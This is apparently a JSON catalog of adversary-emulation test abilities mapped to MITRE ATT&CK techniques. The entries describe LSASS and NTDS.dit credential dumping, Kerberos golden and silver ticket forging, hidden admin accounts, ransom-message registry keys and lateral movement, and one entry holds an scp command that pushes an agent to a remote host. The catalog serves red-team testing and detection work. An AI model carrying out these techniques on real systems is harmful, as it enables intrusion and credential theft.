        "description": "Display ransom message to users at system start-up by configuring registry keys HKLM\\SOFTWARE\\Micosoft\\Windows\\CurrentVersion\\Policies\\System\\LegalNoticeCaption and HKLM\\SOFTWARE\\Micosoft\\Windows\\CurrentVersion\\Policies\\System\\LegalNoticeText.\n\n[SynAck Ransomware](https://www.trendmicro.com/vinfo/es/security/news/cybercrime-and-digital-threats/synack-ransomware-leverages-process-doppelg-nging-for-evasion-and-infection), \n[Grief Ransomware](https://redcanary.com/blog/grief-ransomware/), \n[Maze Ransomware](https://cyware.com/research-and-analysis/maze-ransomware-a-deadly-combination-of-data-theft-and-encryption-to-target-us-organizations-8f27),\n[Pysa Ransomware](https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-destructive-pysa-ransomware),\n[Spook Ransomware](https://community.fortinet.com/t5/FortiEDR/Threat-Coverage-How-FortiEDR-protects-against-Spook-Ransomware/ta-p/204226),\n[DopplePaymer Ransomware](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/Dopplepaymer&threatId=-2147221958),\n[Reedemer Ransomware](https://blog.cyble.com/2022/07/20/redeemer-ransomware-back-action/),\n[Kangaroo Ransomware](https://www.bleepingcomputer.com/news/security/the-kangaroo-ransomware-not-only-encrypts-your-data-but-tries-to-lock-you-out-of-windows/)\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Defacement: Internal Defacement",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Configure LegalNoticeCaption and LegalNoticeText registry keys to display ransom message",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "2fc2e45dde68ab78a97a22ca138652e1",
        "technique_id": "T1491.001",
        "repeatable": false
    },
    {
        "description": "This test simulates an adversary leveraging control.exe\nUpon execution calc.exe will be launched\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution: Control Panel",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Control Panel Items",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "efc033332057f4957e3e190bf4061070",
        "technique_id": "T1218.002",
        "repeatable": false
    },
    {
        "description": "Copy 54ndc47 to remote host (SMB)",
        "buckets": [
            "lateral-movement"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Services: SMB/Windows Admin Shares",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn",
                        "edge": "has_54ndc47_copy"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.not_exists"
            },
            {
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn",
                        "edge": "has_share"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.basic"
            },
            {
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.no_backwards_movement"
            },
            {
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn",
                        "edge": "isAccessibleFrom"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.reachable"
            }
        ],
        "singleton": true,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Copy 54ndc47 (SMB)",
        "tactic": "lateral-movement",
        "plugin": "stockpile",
        "ability_id": "65048ec1-f7ca-49d3-9410-10813e472b30",
        "technique_id": "T1021.002",
        "repeatable": false
    },
    {
        "description": "Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP",
        "buckets": [
            "lateral-movement"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Lateral Tool Transfer",
        "requirements": [],
        "singleton": true,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [
                    "sandcat.go-linux"
                ],
                "command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'rm -f sandcat.go'"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Copy 54ndc47 (WinRM and SCP)",
        "tactic": "lateral-movement",
        "plugin": "stockpile",
        "ability_id": "4908fdc4-74fc-4d7c-8935-26d11ad26a8d",
        "technique_id": "T1570",
        "repeatable": false
    },
    {
        "description": "copy the contents for the clipboard and print them",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Clipboard Data",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "xclip -o",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Copy Clipboard",
        "tactic": "collection",
        "plugin": "stockpile",
        "ability_id": "b007fe0c-c6b0-4fda-915c-255bbc070de2",
        "technique_id": "T1115",
        "repeatable": false
    },
    {
        "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n\nThis test requires steps taken in the test \"Create Volume Shadow Copy with vssadmin\".\nA successful test also requires the export of the SYSTEM Registry hive.\nThis test must be executed on a Windows Domain Controller.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: NTDS",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Copy NTDS.dit from Volume Shadow Copy",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "548f5aa3ec2fcfc6872ee10975480f29",
        "technique_id": "T1003.003",
        "repeatable": false
    },
    {
        "description": "Copy Sandcat file using PowerShell",
        "buckets": [
            "lateral-movement"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Services: Windows Remote Management",
        "requirements": [],
        "singleton": true,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Copy Sandcat File using Powershell",
        "tactic": "lateral-movement",
        "plugin": "stockpile",
        "ability_id": "3734aa1e-c536-42b3-8912-4c91b8bdce90",
        "technique_id": "T1021.006",
        "repeatable": false
    },
    {
        "description": "Copy Sandcat file using PsExec on CMD",
        "buckets": [
            "lateral-movement"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Lateral Tool Transfer",
        "requirements": [],
        "singleton": true,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Copy Sandcat File using PsExec on CMD",
        "tactic": "lateral-movement",
        "plugin": "stockpile",
        "ability_id": "620b674a-7655-436c-b645-bc3e8ea51abd",
        "technique_id": "T1570",
        "repeatable": false
    },
    {
        "description": "Copy from sensitive File from the c$ of another LAN computer with powershell\nhttps://twitter.com/SBousseaden/status/1211636381086339073",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Data from Network Shared Drive",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Copy a sensitive File over Administive share with Powershell",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "e1aac34d578a19d68451a09a37e667ae",
        "technique_id": "T1039",
        "repeatable": false
    },
    {
        "description": "Copy from sensitive File from the c$ of another LAN computer with copy cmd\nhttps://twitter.com/SBousseaden/status/1211636381086339073",
        "buckets": [
            "collection"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Data from Network Shared Drive",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Copy a sensitive File over Administive share with copy",
        "tactic": "collection",
        "plugin": "atomic",
        "ability_id": "47f3e8652525a485114b19e100bba352",
        "technique_id": "T1039",
        "repeatable": false
    },
    {
        "description": "Copies and deletes mail data on Windows\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Email Collection: Mailbox Manipulation",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Copy and Delete Mailbox Data on Windows",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "9d03b18c922b94ebba44d25c430e6e95",
        "technique_id": "T1070.008",
        "repeatable": false
    },
    {
        "description": "Copies a file to a remote host and executes it using PsExec. Requires the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).\n",
        "buckets": [
            "lateral-movement"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Services: SMB/Windows Admin Shares",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Copy and Execute File with PsExec",
        "tactic": "lateral-movement",
        "plugin": "atomic",
        "ability_id": "ca1f1ab85939ac18903d5abc4367fec1",
        "technique_id": "T1021.002",
        "repeatable": false
    },
    {
        "description": "Copies and modifies mail data on Windows\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Email Collection: Mailbox Manipulation",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Copy and Modify Mailbox Data on Windows",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "bdc2a80d621d3361ea727008644b1d15",
        "technique_id": "T1070.008",
        "repeatable": false
    },
    {
        "description": "Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.\nThis test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Steal or Forge Kerberos Tickets: Golden Ticket",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Crafting Active Directory golden tickets with Rubeus",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "107a14acdd84a7d6e7c891177b0db3aa",
        "technique_id": "T1558.001",
        "repeatable": false
    },
    {
        "description": "Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.\nThis test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Steal or Forge Kerberos Tickets: Golden Ticket",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Crafting Active Directory golden tickets with mimikatz",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "e91bbca3e82c76d7780b4326b1882b19",
        "technique_id": "T1558.001",
        "repeatable": false
    },
    {
        "description": "Once the hash of service account is retrieved it is possible to forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets.\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Steal or Forge Kerberos Tickets: Silver Ticket",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Crafting Active Directory silver tickets with mimikatz",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "790523f56191466c7103452ccdbabd33",
        "technique_id": "T1558.002",
        "repeatable": false
    },
    {
        "description": "Create an Alternate Data Stream with PowerShell. Write access is required. To verify execution, the the command \"ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname\"\nin the %temp% direcotry to view all files with hidden data streams. To view the data in the alternate data stream, run \"notepad.exe T1564.004_has_ads_powershell.txt:adstest.txt\" in the %temp% folder.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hide Artifacts: NTFS File Attributes",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create ADS PowerShell",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "1532b3faf25ad1e6f4fba4ada643b253",
        "technique_id": "T1564.004",
        "repeatable": false
    },
    {
        "description": "Create an Alternate Data Stream with the command prompt. Write access is required. Upon execution, run \"dir /a-d /s /r | find \":$DATA\"\" in the %temp%\nfolder to view that the alternate data stream exists. To view the data in the alternate data stream, run \"notepad T1564.004_has_ads.txt:adstest.txt\"\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hide Artifacts: NTFS File Attributes",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create ADS command prompt",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "53be764b84e99052c6c0099ab4968be5",
        "technique_id": "T1564.004",
        "repeatable": false
    },
    {
        "description": "Adversaries may similarly hide user accounts in Windows. Adversaries can set the HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList Registry key value to 0 for a specific user to prevent that user from being listed on the logon screen.\nReference https://attack.mitre.org/techniques/T1564/002/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hide Artifacts: Hidden Users",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create Hidden User in Registry",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "94ada6941f651b12c2a7fbba310a4bde",
        "technique_id": "T1564.002",
        "repeatable": false
    },
    {
        "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump. This particular method uses -mm to produce a mini dump of lsass.exe\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: LSASS Memory",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create Mini Dump of LSASS.exe using ProcDump",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "6f0815bd32e08646588c398d0e79ebb3",
        "technique_id": "T1003.001",
        "repeatable": false
    },
    {
        "description": "Replace accessiblity executable with cmd.exe to provide elevated command prompt from login screen without logging in.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution: Accessibility Features",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create Symbolic Link From osk.exe to cmd.exe",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "6f6518545b5dd35eecbed18dfa828e8c",
        "technique_id": "T1546.008",
        "repeatable": false
    },
    {
        "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by creating a symlink to Volume Shadow Copy.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: NTDS",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create Symlink to Volume Shadow Copy",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "f7ea25ca809e576a3b5b5b1e4dd94ea4",
        "technique_id": "T1003.003",
        "repeatable": false
    },
    {
        "description": "This test is intended to be run from a remote workstation with domain admin context.\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy created with esentutl.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: NTDS",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create Volume Shadow Copy remotely (WMI) with esentutl",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "053d6505f7c4cf792b0ab2f262dff95a",
        "technique_id": "T1003.003",
        "repeatable": false
    },
    {
        "description": "This test is intended to be run from a remote workstation with domain admin context.\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: NTDS",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create Volume Shadow Copy remotely with WMI",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "be6f8d1c9a01d720483c8a5daca1c472",
        "technique_id": "T1003.003",
        "repeatable": false
    },
    {
        "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: NTDS",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create Volume Shadow Copy with Powershell",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "6dc5c587fd22d65b81a443b7ce065ab1",
        "technique_id": "T1003.003",
        "repeatable": false
    },
    {
        "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: NTDS",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create Volume Shadow Copy with WMI",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "cf60378dd1bbaccd4e7391c0317da202",
        "technique_id": "T1003.003",
        "repeatable": false
    },
    {
        "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: NTDS",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create Volume Shadow Copy with vssadmin",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "6b55240dbd6e02df957284328938fcf6",
        "technique_id": "T1003.003",
        "repeatable": false
    },
    {
        "description": "Creates a file and marks it as hidden using the attrib.exe utility.Upon execution, open File Epxplorer and enable View > Hidden Items. Then, open Properties > Details on the file\nand observe that the Attributes are \"SH\" for System and Hidden.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hide Artifacts: Hidden Files and Directories",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create Windows Hidden File with Attrib",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "20277ce46ffe7d08083f8b5ca524b317",
        "technique_id": "T1564.001",
        "repeatable": false
    },
    {
        "description": "Creates a file and marks it as a system file using the attrib.exe utility. Upon execution, open the file in file explorer then open Properties > Details\nand observe that the Attributes are \"SA\" for System and Archive.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hide Artifacts: Hidden Files and Directories",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create Windows System File with Attrib",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "84457d914b35ebe7b506e70b66067f6b",
        "technique_id": "T1564.001",
        "repeatable": false
    },
    {
        "description": "Creating a user with a username containing \"$\"",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hide Artifacts",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create a Hidden User Called \"$\"",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "dedfa0a54c9c13ce5714a0dc2e1f5d1a",
        "technique_id": "T1564",
        "repeatable": false
    },
    {
        "description": "Solarigate persistence is achieved via backdoors deployed via various techniques including using PowerShell with an EncodedCommand\n Powershell -nop -exec bypass -EncodedCommand <encoded command>\nWhere the \u2013EncodedCommand, once decoded, would resemble:\n  Invoke-WMIMethod win32_process -name create -argumentlist \u2018rundll32 c:\\windows\\idmu\\common\\ypprop.dll _XInitImageFuncPtrs\u2019 -ComputerName WORKSTATION\nThe EncodedCommand in this atomic is the following: Invoke-WmiMethod -Path win32_process -Name create -ArgumentList notepad.exe\nYou should expect to see notepad.exe running after execution of this test.\n[Solarigate Analysis from Microsoft](https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/)\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Windows Management Instrumentation",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create a Process using WMI Query and an Encoded Command",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "28004c307d9958351c450cb0384efaf9",
        "technique_id": "T1047",
        "repeatable": false
    },
    {
        "description": "This test tries to mask process creation by creating a new class that inherits from Win32_Process. Indirect call of suspicious method such as Win32_Process::Create can break detection logic.\n[Cybereason blog post No Win32_ProcessNeeded](https://www.cybereason.com/blog/wmi-lateral-movement-win32)\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Windows Management Instrumentation",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create a Process using obfuscated Win32_Process",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "80cda763aa992b775038ce134c892070",
        "technique_id": "T1047",
        "repeatable": false
    },
    {
        "description": "Creates a new Domain User using the credentials of the Current User\n",
        "buckets": [
            "persistence"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Create Account: Domain Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create a new Domain Account using PowerShell",
        "tactic": "persistence",
        "plugin": "atomic",
        "ability_id": "8a95e17c084e9a8bf41c69c73beeb0af",
        "technique_id": "T1136.002",
        "repeatable": false
    },
    {
        "description": "Creates a new admin user in a command prompt.\n",
        "buckets": [
            "persistence"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Create Account: Local Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create a new Windows admin user",
        "tactic": "persistence",
        "plugin": "atomic",
        "ability_id": "5ceb5fd63b2cea41b66395f610aed024",
        "technique_id": "T1136.001",
        "repeatable": false
    },
    {
        "description": "Creates a new domain admin user in a command prompt.\n",
        "buckets": [
            "persistence"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Create Account: Domain Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create a new Windows domain admin user",
        "tactic": "persistence",
        "plugin": "atomic",
        "ability_id": "c6bf167afe0b85a1e88127fc0d093e4d",
        "technique_id": "T1136.002",
        "repeatable": false
    },
    {
        "description": "Create a new account similar to ANONYMOUS LOGON in a command prompt.\n",
        "buckets": [
            "persistence"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Create Account: Domain Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create a new account similar to ANONYMOUS LOGON",
        "tactic": "persistence",
        "plugin": "atomic",
        "ability_id": "b563c36cff8c0a66194dd5a4f1daa1be",
        "technique_id": "T1136.002",
        "repeatable": false
    },
    {
        "description": "Establishes persistence by creating a new time provider registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nThe new time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt\nin C:\\Users\\Public\\ as validation that the test is successful.\n\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Time Providers",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create a new time provider",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "c13fdd68cb4b40650f00e5451ffde021",
        "technique_id": "T1547.003",
        "repeatable": false
    },
    {
        "description": "Creates a new user in PowerShell. Upon execution, details about the new account will be displayed in the powershell session. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_PowerShell\"\n",
        "buckets": [
            "persistence"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Create Account: Local Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create a new user in PowerShell",
        "tactic": "persistence",
        "plugin": "atomic",
        "ability_id": "f39aace719f4cdcf8569001f7a25aabf",
        "technique_id": "T1136.001",
        "repeatable": false
    },
    {
        "description": "Creates a new user in a command prompt. Upon execution, \"The command completed successfully.\" will be displayed. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_CMD\"\n",
        "buckets": [
            "persistence"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Create Account: Local Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create a new user in a command prompt",
        "tactic": "persistence",
        "plugin": "atomic",
        "ability_id": "c93df79781db0a1ed7cc34323f2ecec0",
        "technique_id": "T1136.001",
        "repeatable": false
    },
    {
        "description": "Creating a user with a username containing with a space on the end",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hide Artifacts",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create an \"Administrator \" user (with a space on the end)",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "83a5ad479c9e313e60f34380e193102a",
        "technique_id": "T1564",
        "repeatable": false
    },
    {
        "description": "Creates and executes a simple batch script. Upon execution, CMD will briefly launch to run the batch script then close again.\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create and Execute Batch Script",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "d4aa13cd6322080455d334e6fc2d5972",
        "technique_id": "T1059.003",
        "repeatable": false
    },
    {
        "description": "The following technique utilizes sc.exe and sdset to change the security descriptor of a service and \"hide\" it from Get-Service or sc query.\n\nUpon successful execution, sc.exe creates a new service changes the security descriptor.\n\nhttps://twitter.com/Alh4zr3d/status/1580925761996828672\nhttps://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hide Artifacts",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create and Hide a Service with sc.exe",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "91531bc5832f6753d924bae901932cb5",
        "technique_id": "T1564",
        "repeatable": false
    },
    {
        "description": "Create a simple Hyper-V VM (Windows native hypervisor) and start up the machine\nCleanup command stops and deletes the newly created VM\nhttps://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v\nhttps://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/\nhttps://attack.mitre.org/techniques/T1564/006/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Run Virtual Instance",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create and start Hyper-V virtual machine",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "5b0527d3382ac91860501cccc9595348",
        "technique_id": "T1564.006",
        "repeatable": false
    },
    {
        "description": "Create a simple VirtualBox VM and start up the machine\nCleanup command stops and deletes the newly created VM and associated files\nhttps://www.virtualbox.org/manual/ch08.html#vboxmanage-startvm\nhttps://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/\nhttps://attack.mitre.org/techniques/T1564/006/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Run Virtual Instance",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Create and start VirtualBox virtual machine",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "e572cf6ff4a756e5549353ca96bed1d6",
        "technique_id": "T1564.006",
        "repeatable": false
    },
    {
        "description": "After execution the new account will be active and added to the Administrators group",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Valid Accounts: Local Accounts",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
